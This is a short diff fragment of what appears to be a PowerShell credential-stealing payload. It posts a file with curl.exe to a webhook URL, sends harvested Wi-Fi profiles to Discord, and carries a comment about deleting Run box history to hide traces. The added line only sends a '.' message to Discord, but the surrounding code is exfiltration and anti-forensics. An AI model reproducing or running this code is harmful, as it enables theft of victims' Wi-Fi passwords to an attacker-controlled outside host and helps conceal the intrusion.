@@ -26,6 +26,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Ita: $wifiProfiles_IT"}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Eng: $wifiProfiles_EN"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "."}
 
 
 # Delete run box history
